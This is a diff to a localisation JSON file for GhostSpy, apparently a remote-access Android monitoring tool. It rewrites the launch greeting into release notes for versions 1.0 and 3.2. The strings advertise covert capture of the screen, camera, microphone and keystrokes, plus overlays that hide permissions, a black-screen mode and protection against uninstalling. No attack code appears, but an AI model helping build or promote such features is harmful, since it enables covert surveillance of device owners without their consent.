@@ -194,25 +194,112 @@
     "newDevices": "New Devices",
     "systemStatus": "System Status",
     "introduce": {
-      "greeting": "Hello, welcome to the launch of our newest monitoring system, GhostSpy!",
-      "introduce": "We would like to express our sincere gratitude for your continued support and trust in our projects. It is thanks to you that we have achieved this significant milestone, and we are excited to present GhostSpy, a powerful and intuitive tool for device monitoring.",
-      "reason": "Explore all the possibilities that GHOSTSPY offers:",
-      "feature": {
-        "title": "Check out the current features of GhostSpy below:",
-        "screen-monitor": "• <span style='font-weight: 600; color: white;'>Screen Monitoring: </span>Watch in real-time what is being displayed on the device screen.",
-        "screen-skeleton": "• <span style='font-weight: 600; color: white;'>Screen Skeleton Monitoring: </span> Get a structured view of the activities on the screen.",
-        "camera-monitor": "• <span style='font-weight: 600; color: white;'>Camera Monitoring: </span>Capture and view images from the device's camera.",
-        "mic-monitor": "• <span style='font-weight: 600; color: white;'>Microphone Monitoring: </span>Listen to what is being captured by the device's microphone.",
-        "key-log": "• <span style='font-weight: 600; color: white;'>Key Logs Monitoring: </span>Record and analyze all the keys typed.",
-        "gallery-manager": "• <span style='font-weight: 600; color: white;'>Gallery Manager: </span> Access and organize all the images and videos stored on the device.",
-        "real-location": "• <span style='font-weight: 600; color: white;'>Real-time Location Monitoring: </span>See the exact location of the device in real-time.",
-        "call-history": "• <span style='font-weight: 600; color: white;'>Call History Monitoring: </span>Review and track all outgoing and incoming calls.",
-        "privacy-mode": "• <span style='font-weight: 600; color: white;'>Privacy Mode - Black Screen: </span>Activate a black screen on the device to ensure total privacy during monitoring."
-      },
-      "feedback": "We are excited to see how GhostSpy will meet your monitoring and management needs. Your feedback is essential to us, so please share your experiences and suggestions so we can continue to improve GhostSpy.",
-      "thanks": "Once again, thank you for joining us on this journey.",
-      "under": "Sincerely",
-      "supporter": "Go1ano - GhostSpy"
+      "versions": [
+        {
+          "version": "Version 3.2",
+          "greeting": "Welcome to version 3.2 of GhostSpy!",
+          "introduce": "In this version, we bring several improvements and new features...",
+          "title": "👻 GhostSpy 3.2 - What's New:",
+          "features": [
+            {
+              "title": "▪ Increased Server Capacity",
+              "description": "We have upgraded our servers to provide faster and smoother control, ensuring optimal performance for all users."
+            },
+            {
+              "title": "▪ New User Interface",
+              "description": "We have introduced a revamped design for the home screen and registration process, providing a more modern and intuitive experience."
+            },
+            {
+              "title": "▪ Permission Hiding Enhancement",
+              "description": "We added an overlay that automatically hides permissions and another to prevent the accidental removal of the app."
+            },
+            {
+              "title": "▪ Offline Keylogger",
+              "description": "Now you can capture all key logs even without active monitoring and download them directly from the dashboard as a .txt file."
+            },
+            {
+              "title": "▪ Keylogger Optimization",
+              "description": "We improved performance and fixed issues that prevented the capture of certain data."
+            },
+            {
+              "title": "▪ Optimized Skeleton Reader",
+              "description": "The skeleton reader is now faster and more accurate, improving overall control."
+            },
+            {
+              "title": "▪ Structural Optimization",
+              "description": "The entire system has been optimized to ensure a smoother and more efficient user experience."
+            },
+            {
+              "title": "▪ Improved Layout for Mobile Devices",
+              "description": "The layout has been enhanced for control on smartphones, tablets, and iPads, enabling continuous monitoring from these devices."
+            },
+            {
+              "title": "▪ Improved Screen Control",
+              "description": "We changed the code structure, eliminating a 30% performance loss. Now, screen control is 40x faster and smoother."
+            },
+            {
+              "title": "▪ Uninstallation Protection",
+              "description": "We strengthened the protection against removal, making it impossible to uninstall the app without authorization."
+            },
+            {
+              "title": "▪ Remote Uninstallation",
+              "description": "Now you can remove the app remotely through the Remove Device, Delete App function on the control panel."
+            }
+          ],
+          "feedback": "Our goal is to make your operations even easier...",
+          "thanks": "Thank you for trusting GhostSpy.",
+          "under": "Sincerely",
+          "supporter": "GhostSpy Team"
+        },
+        {
+          "version": "Version 1.0",
+          "greeting": "Hello, welcome to the launch of our brand new monitoring system, GhostSpy!",
+          "introduce": "We would like to express our sincere gratitude for your continued support and trust in our projects. It is thanks to you that we have been able to reach this significant milestone, and we are excited to introduce GhostSpy, a powerful and intuitive tool for device monitoring.",
+          "title": "Check out the list of GhostSpy's current features below:",
+          "features": [
+            {
+              "title": "▪ Screen Monitoring",
+              "description": "Track in real-time what is being displayed on the device's screen."
+            },
+            {
+              "title": "▪ Screen Skeleton Monitoring",
+              "description": "Get a structured view of activities on the screen."
+            },
+            {
+              "title": "▪ Camera Monitoring",
+              "description": "Capture and view images from the device's camera."
+            },
+            {
+              "title": "▪ Microphone Monitoring",
+              "description": "Listen to what is being picked up by the device's microphone."
+            },
+            {
+              "title": "▪ Keystroke Monitoring (Key Logs)",
+              "description": "Record and analyze all typed keys."
+            },
+            {
+              "title": "▪ Gallery Manager",
+              "description": "Access and organize all images and videos stored on the device."
+            },
+            {
+              "title": "▪ Real-Time Location Monitoring",
+              "description": "See the exact location of the device in real-time."
+            },
+            {
+              "title": "▪ Call History Monitoring",
+              "description": "Review and track all outgoing and incoming calls."
+            },
+            {
+              "title": "▪ Privacy Mode - Black Screen",
+              "description": "Activate a black screen on the device to ensure complete privacy during monitoring."
+            }
+          ],
+          "feedback": "We are eager to see how GhostSpy will facilitate your monitoring and management needs. Your feedback is essential to us, so please share your experiences and suggestions to continue improving GhostSpy.",
+          "thanks": "Once again, thank you for being with us on this journey.",
+          "under": "Sincerely",
+          "supporter": "Go1ano - GhostSpy"
+        }
+      ]
     }
   },
 
